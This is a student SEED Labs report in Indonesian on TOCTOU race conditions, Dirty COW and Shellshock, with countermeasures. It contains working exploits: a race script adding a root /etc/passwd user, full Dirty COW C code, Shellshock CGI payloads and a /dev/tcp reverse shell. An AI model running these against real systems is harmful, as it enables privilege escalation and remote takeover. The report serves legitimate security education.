# R3 — OS-Level Attacks

> **SEED Labs 2.0 · Ubuntu 20.04**
> Muhammad Tamim Nugraha — 5024231060 · Teknik Komputer ITS 2023

---

## Daftar Isi

1. [Race Condition (TOCTOU)](#1-race-condition-toctou)
2. [Dirty COW Vulnerability](#2-dirty-cow-vulnerability-cve-2016-5195)
3. [Shellshock Attack](#3-shellshock-attack-cve-2014-6271)
4. [Kesimpulan](#kesimpulan)
5. [Referensi](#referensi)

---

## 1. Race Condition (TOCTOU)

### 1.1 Tujuan Eksperimen

Memahami kerentanan *Time-of-Check to Time-of-Use* (TOCTOU) pada program Set-UID, di mana terdapat jeda waktu (*race window*) antara pemeriksaan keamanan (*access check*) dan penggunaan resource (*file operation*). Penyerang mengeksploitasi jeda ini dengan mengubah target resource (melalui *symlink*) antara kedua operasi tersebut.

### 1.2 Dasar Teori

**TOCTOU Race Condition terjadi dalam pola berikut:**

```
Waktu ──────────────────────────────────────────────►

Program Set-UID (root):
    [1] access(file, W_OK)  ────────────  [3] open(file, "w")
         ↑ Check: "Apakah user                ↑ Use: Buka dan tulis
           boleh menulis                        ke file
           ke file ini?"
           → Ya (file milik user)               → Menulis ke /etc/passwd!

Attacker:
                               [2] ln -sf /etc/passwd file
                                   ↑ Symlink swap!
                                     file → /etc/passwd
```

### 1.3 Langkah Eksploitasi

#### Task 1: Program Set-UID Rentan

```c
/* vulp.c — Program TOCTOU yang rentan */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main()
{
    char *fn = "/tmp/XYZ";
    char buffer[60];
    FILE *fp;

    /* Dapatkan input dari user */
    scanf("%50s", buffer);

    /* CHECK: Apakah real user memiliki izin menulis ke file? */
    if (access(fn, W_OK) != 0) {
        fprintf(stderr, "[-] Permission denied\n");
        exit(1);
    }
    /* ═══════════ RACE WINDOW ═══════════ */
    /* Antara access() dan fopen(), attacker bisa mengganti
       /tmp/XYZ dari file biasa menjadi symlink ke /etc/passwd */

    /* USE: Buka file dan tulis (dengan effective UID = root) */
    fp = fopen(fn, "a+");
    if (!fp) {
        perror("fopen");
        exit(2);
    }

    /* Menulis data user ke file — jika symlink berhasil,
       ini menulis ke /etc/passwd sebagai root! */
    fwrite("\n", sizeof(char), 1, fp);
    fwrite(buffer, sizeof(char), strlen(buffer), fp);
    fclose(fp);

    printf("[+] Data written to %s\n", fn);
    return 0;
}
```

```bash
# Kompilasi dan set-up
gcc -o vulp vulp.c
sudo chown root:root vulp
sudo chmod 4755 vulp
```

#### Task 2: Program Serangan

```bash
# Buat file target yang dimiliki user
touch /tmp/XYZ

# --- Attacker Script (target_link.sh) ---
cat > target_link.sh << 'SCRIPT'
#!/bin/bash
# Loop cepat untuk swap symlink
while true; do
    # Ganti ke symlink menunjuk /etc/passwd
    ln -sf /etc/passwd /tmp/XYZ
    # Ganti kembali ke file biasa (agar access() lolos)
    ln -sf /tmp/safe_file /tmp/XYZ
done
SCRIPT
chmod +x target_link.sh
```

```bash
# Buat file aman yang dimiliki user
touch /tmp/safe_file
chmod 666 /tmp/safe_file

# Buat baris passwd untuk user baru dengan UID 0 (root)
# Format: username:password:UID:GID:info:home:shell
# Password hash untuk "password123" (gunakan openssl):
PASS_HASH=$(openssl passwd -1 -salt xyz password123)
echo "PAYLOAD: hacker:${PASS_HASH}:0:0:Hacker:/root:/bin/bash"
```

#### Task 3: Memenangkan Race Condition

```bash
# Terminal 1: Jalankan attacker script
./target_link.sh &

# Terminal 2: Loop program rentan hingga race condition terpenuhi
cat > attack_loop.sh << 'SCRIPT'
#!/bin/bash

PAYLOAD="hacker:$(openssl passwd -1 -salt xyz password123):0:0::/root:/bin/bash"

# Backup /etc/passwd
sudo cp /etc/passwd /etc/passwd.bak

CHECK_FILE=/tmp/XYZ
OLD=$(stat -c '%Z' /etc/passwd)

while true; do
    echo "$PAYLOAD" | ./vulp
    NEW=$(stat -c '%Z' /etc/passwd)
    if [ "$OLD" != "$NEW" ]; then
        echo "[!] RACE CONDITION WON — /etc/passwd modified!"
        break
    fi
done
SCRIPT
chmod +x attack_loop.sh
```

```bash
# Jalankan serangan
./attack_loop.sh

# Verifikasi
tail -1 /etc/passwd
# hacker:$1$xyz$...:0:0::/root:/bin/bash

# Login sebagai hacker (root)
su hacker
# Password: password123
whoami
# root
```

#### Task 4: Countermeasure — `open()` + `fstat()`

```c
/* vulp_fixed.c — Versi aman tanpa TOCTOU */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

int main()
{
    char *fn = "/tmp/XYZ";
    char buffer[60];
    struct stat statbuf;

    scanf("%50s", buffer);

    /* Buka file terlebih dahulu (atomic operation) */
    int fd = open(fn, O_WRONLY | O_APPEND | O_NOFOLLOW);
    if (fd < 0) {
        perror("open");
        exit(1);
    }

    /* Periksa ownership SETELAH file sudah dibuka */
    fstat(fd, &statbuf);
    if (statbuf.st_uid != getuid()) {
        fprintf(stderr, "[-] File owner mismatch!\n");
        close(fd);
        exit(2);
    }

    /* O_NOFOLLOW mencegah mengikuti symlink */
    /* fstat() memeriksa file yang SUDAH dibuka (bukan path) */
    write(fd, "\n", 1);
    write(fd, buffer, strlen(buffer));
    close(fd);

    printf("[+] Secure write completed\n");
    return 0;
}
```

#### Task 5: Countermeasure — Sticky Symlink Protection

```bash
# Ubuntu 20.04 memiliki proteksi symlink pada sticky directories
# Periksa konfigurasi
sudo sysctl fs.protected_symlinks
# fs.protected_symlinks = 1

# Aktifkan jika belum
sudo sysctl -w fs.protected_symlinks=1

# Dengan proteksi ini aktif:
# Di direktori sticky (/tmp), symlink hanya bisa diikuti jika:
# 1. UID pemilik symlink == UID proses yang mengikuti, ATAU
# 2. UID pemilik symlink == UID pemilik direktori
```

### 1.4 Analisis Percobaan

**Mengapa race condition berhasil:**

1. **Non-atomic check-then-use**: `access()` dan `fopen()` adalah dua syscall terpisah. Kernel tidak menjamin atomicity antara keduanya.

2. **access() mengecek Real UID**: `access()` menggunakan *real UID* (user biasa) untuk memeriksa izin. Jika file `/tmp/XYZ` dimiliki user, pemeriksaan berhasil.

3. **fopen() menggunakan Effective UID**: `fopen()` menggunakan *effective UID* (root, karena Set-UID). Jika `/tmp/XYZ` sudah di-symlink ke `/etc/passwd`, root memiliki izin menulis ke sana.

4. **Probabilistik**: Serangan tidak selalu berhasil pada percobaan pertama karena timing harus tepat. Loop dan multi-threading meningkatkan probabilitas keberhasilan.

**Countermeasure: `O_NOFOLLOW` + `fstat()`**:
- `O_NOFOLLOW`: Menolak membuka symlink
- `fstat()`: Memeriksa file descriptor yang sudah dibuka (bukan pathname), menghilangkan TOCTOU window

### 1.5 Bukti Eksploitasi

![Bukti Race Condition TOCTOU](images/placeholder-r3-race.png)

---

## 2. Dirty COW Vulnerability (CVE-2016-5195)

### 2.1 Tujuan Eksperimen

Memahami dan mengeksploitasi kerentanan *Copy-on-Write* (COW) pada kernel Linux yang memungkinkan pengguna biasa menulis ke file *read-only*, termasuk file milik root. Dirty COW (CVE-2016-5195) adalah *privilege escalation* vulnerability yang mempengaruhi kernel Linux versi 2.6.22 hingga 4.8.3.

### 2.2 Dasar Teori

**Copy-on-Write (COW) Normal:**

```
1. Proses memanggil mmap() dengan MAP_PRIVATE pada file read-only
2. Kernel membuat virtual mapping ke halaman fisik file
3. Saat proses MENULIS ke mapping, kernel:
   a. Menyalin halaman fisik ke lokasi baru (COPY)
   b. Memperbarui page table untuk menunjuk ke salinan
   c. Menulis data ke salinan (bukan file asli)
```

**Bug Dirty COW:**
Race condition antara dua thread menyebabkan kernel menulis langsung ke halaman file asli (bukan salinan), mengabaikan proteksi read-only.

```
Thread 1 (madvise):           Thread 2 (write via /proc/self/mem):
                              
MADV_DONTNEED ──────►         write() ke mapped address
(hapus mapping COW)           (kernel menulis ke halaman ASLI
                               karena mapping sudah dihapus!)
```

### 2.3 Langkah Eksploitasi

#### Persiapan

```bash
# Periksa versi kernel (harus < 4.8.3 untuk vulnerable)
uname -r
# Contoh: 4.4.0-xxx (vulnerable)

# Di SEED Labs VM, kernel sengaja dibuat vulnerable
```

#### Task 1: Membuat File Target Read-Only

```bash
# Buat file milik root yang read-only untuk user biasa
sudo sh -c 'echo "Konten asli yang dilindungi — hanya root yang bisa mengubah" > /tmp/zzz'
sudo chmod 644 /tmp/zzz
sudo chown root:root /tmp/zzz

# Verifikasi — user biasa TIDAK bisa menulis
echo "test" >> /tmp/zzz
# bash: /tmp/zzz: Permission denied

# Lihat isi file
cat /tmp/zzz
# Konten asli yang dilindungi — hanya root yang bisa mengubah
```

#### Task 2: Exploit Dirty COW

```c
/* cow_attack.c — Dirty COW (CVE-2016-5195) Exploit */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>

/* File target dan isi pengganti */
const char *target_file = "/tmp/zzz";
const char *replacement = "FILE TELAH DIMODIFIKASI OLEH DIRTY COW!!! ";

void *map;
int stop = 0;

/* Thread 1: Terus-menerus panggil madvise(MADV_DONTNEED)
   untuk menghapus private COW mapping */
void *madvise_thread(void *arg)
{
    int file_size = (int)(intptr_t)arg;
    while (!stop) {
        madvise(map, file_size, MADV_DONTNEED);
        usleep(1);
    }
    return NULL;
}

/* Thread 2: Menulis ke /proc/self/mem pada offset mapping
   untuk trigger write ke halaman file yang sebenarnya */
void *write_thread(void *arg)
{
    char *str = (char *)arg;

    /* Buka /proc/self/mem — interface langsung ke memory proses */
    int fd = open("/proc/self/mem", O_RDWR);
    if (fd < 0) {
        perror("open /proc/self/mem");
        return NULL;
    }

    while (!stop) {
        /* Seek ke alamat mapping */
        lseek(fd, (off_t)map, SEEK_SET);

        /* Tulis data pengganti
           Karena race condition, kadang ini menulis ke:
           - Salinan COW (benar, tidak berbahaya)
           - Halaman file ASLI (BUG! → Dirty COW) */
        write(fd, str, strlen(str));

        usleep(1);
    }

    close(fd);
    return NULL;
}

int main()
{
    struct stat st;
    pthread_t pth1, pth2;

    /* Buka file target sebagai READ-ONLY */
    int fd = open(target_file, O_RDONLY);
    if (fd < 0) {
        perror("open target");
        return 1;
    }

    fstat(fd, &st);
    printf("[*] File size: %ld bytes\n", st.st_size);
    printf("[*] Target: %s\n", target_file);

    /* Map file ke memori sebagai MAP_PRIVATE (COW) */
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) {
        perror("mmap");
        return 2;
    }
    printf("[*] Mapped at: %p\n", map);
    printf("[*] Starting race condition threads...\n");

    /* Jalankan dua thread yang saling "berlomba" */
    pthread_create(&pth1, NULL, madvise_thread,
                   (void *)(intptr_t)st.st_size);
    pthread_create(&pth2, NULL, write_thread, (void *)replacement);

    /* Biarkan berjalan beberapa detik */
    sleep(5);
    stop = 1;

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    printf("[+] Attack selesai. Periksa file:\n");
    close(fd);

    return 0;
}
```

```bash
# Kompilasi
gcc -pthread -o cow_attack cow_attack.c

# Lihat isi file sebelum serangan
echo "=== SEBELUM ==="
cat /tmp/zzz

# Jalankan exploit (sebagai user biasa!)
./cow_attack

# Lihat isi file setelah serangan
echo "=== SESUDAH ==="
cat /tmp/zzz
# Output: FILE TELAH DIMODIFIKASI OLEH DIRTY COW!!!
```

#### Task 3: Privilege Escalation via /etc/passwd

```bash
# Serangan yang lebih berbahaya: modifikasi /etc/passwd
# Ganti UID root menjadi UID user, atau tambahkan user baru

# PERHATIAN: Ini bisa merusak sistem!
# Backup dulu:
sudo cp /etc/passwd /etc/passwd.bak

# Modifikasi exploit untuk target /etc/passwd
# Ganti baris "root:x:0:0:..." untuk menghapus password requirement
# Atau tambahkan user baru dengan UID 0
```

### 2.4 Analisis Percobaan

**Root cause CVE-2016-5195:**

1. **Race condition di kernel mm subsystem**: Di `mm/gup.c`, fungsi `get_user_pages()` menangani akses memori. Ketika thread 1 menghapus mapping (MADV_DONTNEED) tepat saat thread 2 sedang menulis, page fault handler kehilangan flag COW.

2. **Dua langkah yang seharusnya atomic**:
   - Langkah 1: Periksa apakah halaman perlu di-copy (COW check)
   - Langkah 2: Lakukan operasi tulis
   - Antara langkah 1 dan 2, `madvise(MADV_DONTNEED)` menghapus mapping private, menyebabkan kernel "lupa" bahwa copy sudah dibuat dan menulis langsung ke file mapping asli.

3. **Bug berusia 9 tahun**: Diperkenalkan di kernel 2.6.22 (2007) dan baru ditemukan tahun 2016. Menunjukkan bahwa race condition sulit dideteksi melalui code review.

**Mitigasi:**
- Update kernel ke versi ≥ 4.8.3 (patch resmi)
- Kernel patch: Menambahkan flag `FOLL_COW` yang memastikan COW page tidak direset oleh `madvise()`

### 2.5 Bukti Eksploitasi

![Bukti Dirty COW Exploitation](images/placeholder-r3-dirtycow.png)

---

## 3. Shellshock Attack (CVE-2014-6271)

### 3.1 Tujuan Eksperimen

Memahami kerentanan Shellshock pada GNU Bash yang memungkinkan eksekusi perintah arbitrary melalui manipulasi *environment variables*. Kerentanan ini sangat berbahaya karena banyak sistem menggunakan Bash untuk memproses input (CGI scripts, SSH forced commands, DHCP clients).

### 3.2 Dasar Teori

**Bash Environment Variable Function Export:**

```bash
# Bash memungkinkan export fungsi melalui environment variable
foo() { echo "Ini fungsi foo"; }
export -f foo

# Representasi internal sebagai env var:
# foo=() { echo "Ini fungsi foo"; }
```

**Bug Shellshock:**
Bash tidak berhenti mem-parsing setelah definisi fungsi berakhir. Kode apapun setelah `}` dieksekusi saat Bash baru di-spawn:

```bash
# Vulnerable:
env x='() { :;}; echo VULNERABLE' bash -c "echo test"
# Output jika vulnerable:
# VULNERABLE
# test

# Parser Bash melihat:
# x = () { :; }           ← Definisi fungsi (: = no-op)
#          ; echo VULNERABLE  ← DIEKSEKUSI saat Bash startup!
```

### 3.3 Langkah Eksploitasi

#### Task 1: Verifikasi Kerentanan

```bash
# Test apakah Bash rentan
env x='() { :;}; echo "[!] BASH IS VULNERABLE TO SHELLSHOCK"' bash -c "echo Normal execution"

# Jika output menampilkan:
# [!] BASH IS VULNERABLE TO SHELLSHOCK
# Normal execution
# → Bash RENTAN

# Jika hanya menampilkan:
# Normal execution
# → Bash sudah di-patch
```

```bash
# Gunakan bash vulnerable yang disediakan SEED Labs
# (biasanya di /bin/bash_shellshock atau container khusus)
ls -la /bin/bash_shellshock

# Test dengan Bash vulnerable
env x='() { :;}; echo PWNED' /bin/bash_shellshock -c "echo safe"
# Output:
# PWNED
# safe
```

#### Task 2: Eksfiltrasi Informasi

```bash
# Membaca file sensitif
env x='() { :;}; cat /etc/passwd' /bin/bash_shellshock -c "echo hello"

# Melihat informasi sistem
env x='() { :;}; uname -a; id; whoami' /bin/bash_shellshock -c ":"

# Dump environment variables
env x='() { :;}; env' /bin/bash_shellshock -c ":"
```

#### Task 3: Serangan via CGI (Web Server)

Setup Apache dengan CGI module:

```bash
# Install dan konfigurasi Apache CGI
sudo apt-get update
sudo apt-get install apache2
sudo a2enmod cgi

# Buat CGI script yang menggunakan Bash
sudo tee /usr/lib/cgi-bin/test.cgi << 'EOF'
#!/bin/bash_shellshock

echo "Content-type: text/plain"
echo ""
echo "=== CGI Environment ==="
echo "Hello from CGI!"
echo "Server: $(hostname)"
echo "Date: $(date)"
EOF

sudo chmod 755 /usr/lib/cgi-bin/test.cgi
sudo systemctl restart apache2
```

```bash
# Verifikasi CGI bekerja normal
curl http://localhost/cgi-bin/test.cgi

# --- SERANGAN SHELLSHOCK via HTTP ---

# Eksploitasi melalui User-Agent header
curl -A "() { :;}; echo Content-type: text/plain; echo; echo SHELLSHOCK_RCE; /bin/id" \
    http://localhost/cgi-bin/test.cgi

# Output:
# SHELLSHOCK_RCE
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Eksploitasi melalui Referer header
curl -H "Referer: () { :;}; echo Content-type: text/plain; echo; cat /etc/passwd" \
    http://localhost/cgi-bin/test.cgi

# Reverse shell via Shellshock CGI
curl -A "() { :;}; /bin/bash -i >& /dev/tcp/10.9.0.1/9090 0>&1" \
    http://localhost/cgi-bin/test.cgi
# (Pastikan listener nc -lvp 9090 berjalan di 10.9.0.1)
```

#### Task 4: Shellshock via Set-UID Program

```c
/* shock_suid.c — Program Set-UID yang memanggil system() */
#include <stdio.h>
#include <stdlib.h>

int main()
{
    /* system() menggunakan /bin/sh (bash) untuk eksekusi */
    system("/bin/ls -la");
    return 0;
}
```

```bash
gcc -o shock_suid shock_suid.c
sudo chown root:root shock_suid
sudo chmod 4755 shock_suid

# Pastikan /bin/sh menunjuk ke bash vulnerable
sudo ln -sf /bin/bash_shellshock /bin/sh

# Eksploitasi — inject melalui env var yang diteruskan ke bash
export foo='() { :;}; /bin/sh'
./shock_suid
# Mendapatkan root shell!
whoami
# root
```

#### Task 5: Variant — CVE-2014-7169

```bash
# Shellshock variant: parser bypass
env X='() { (a)=>\' /bin/bash_shellshock -c "echo date"
# Jika file bernama 'echo' dibuat berisi output dari 'date':
cat echo
# → Bash masih vulnerable terhadap variant

# Variant lain — incomplete function parsing
env -i X=' () { }; echo VARIANT_VULNERABLE' /bin/bash_shellshock -c 'echo safe'
```

#### Task 6: Countermeasures

```bash
# 1. Update Bash ke versi >= 4.3 patch 25
sudo apt-get update && sudo apt-get install --only-upgrade bash

# Verifikasi patch
bash --version
# GNU bash, version 5.0.x (patched)

env x='() { :;}; echo VULN' bash -c "echo test"
# Output hanya: test (AMAN)

# 2. Kembalikan /bin/sh ke dash (default Ubuntu)
sudo ln -sf /bin/dash /bin/sh

# 3. Gunakan mod_suexec atau mod_fcgid sebagai alternatif CGI
# 4. WAF rules untuk mendeteksi pattern "() {"
```

### 3.4 Analisis Percobaan

**Root cause Shellshock:**

1. **Parsing environment variables saat startup**: Bash memeriksa semua env vars saat shell baru di-spawn. Jika value dimulai dengan `() {`, Bash menginterpretasikannya sebagai definisi fungsi.

2. **Kegagalan parsing boundary**: Setelah `}` yang menutup definisi fungsi, parser Bash **terus mengeksekusi** perintah berikutnya. Seharusnya parser berhenti setelah definisi fungsi selesai.

3. **Attack surface sangat luas**:
   - **CGI**: HTTP headers (User-Agent, Referer, Cookie) menjadi env vars (`HTTP_USER_AGENT`, `HTTP_REFERER`, dll.)
   - **SSH**: Variable `SSH_ORIGINAL_COMMAND` pada forced commands
   - **DHCP**: Client option processing melalui Bash scripts
   - **Set-UID**: `system()` dan `popen()` memanggil `/bin/sh`

4. **Severity: CVSS 10.0**: Remote Code Execution tanpa autentikasi, memengaruhi jutaan server web di seluruh dunia.

**Timeline:**
- Bug diperkenalkan: ~1989 (Bash 1.03)
- Ditemukan: September 2014 oleh Stéphane Chazelas
- Patch pertama: 24 September 2014
- Variant ditemukan: CVE-2014-7169, CVE-2014-7186, CVE-2014-7187

### 3.5 Bukti Eksploitasi

![Bukti Shellshock via CLI](images/placeholder-r3-shellshock-cli.png)

![Bukti Shellshock via CGI](images/placeholder-r3-shellshock-cgi.png)

---

## Kesimpulan

| Serangan | CVE | Severity | Penyebab | Mitigasi |
|---|---|---|---|---|
| **Race Condition** | — | Medium-High | Non-atomic check-use pattern | `O_NOFOLLOW`, `fstat()`, `fs.protected_symlinks` |
| **Dirty COW** | CVE-2016-5195 | High (7.8) | Race condition di kernel mm | Kernel update ≥ 4.8.3 |
| **Shellshock** | CVE-2014-6271 | Critical (10.0) | Bash function parsing bug | Bash update, ganti `/bin/sh` ke dash |

Ketiga serangan ini mendemonstrasikan bahwa kerentanan tingkat OS (*operating system*) memiliki dampak yang sangat luas karena:
1. **Foundational**: OS adalah lapisan dasar — bug di kernel/shell memengaruhi semua aplikasi di atasnya
2. **Persistent**: Bug bisa tersembunyi selama bertahun-tahun (Dirty COW: 9 tahun, Shellshock: 25 tahun)
3. **Remote Exploitable**: Shellshock memungkinkan RCE tanpa autentikasi melalui web

---

## Referensi

1. Du, W. (2019). *Computer & Internet Security*, Chapter 7-9: Race Condition, Dirty COW, Shellshock.
2. SEED Lab — Race Condition: [https://seedsecuritylabs.org/Labs_20.04/Software/Race_Condition/](https://seedsecuritylabs.org/Labs_20.04/Software/Race_Condition/)
3. SEED Lab — Dirty COW: [https://seedsecuritylabs.org/Labs_20.04/Software/Dirty_COW/](https://seedsecuritylabs.org/Labs_20.04/Software/Dirty_COW/)
4. SEED Lab — Shellshock: [https://seedsecuritylabs.org/Labs_20.04/Software/Shellshock/](https://seedsecuritylabs.org/Labs_20.04/Software/Shellshock/)
5. CVE-2016-5195 (Dirty COW): [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195)
6. CVE-2014-6271 (Shellshock): [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271)

---

<p align="center"><em>R3 — OS-Level Attacks · Muhammad Tamim Nugraha · 5024231060</em></p>
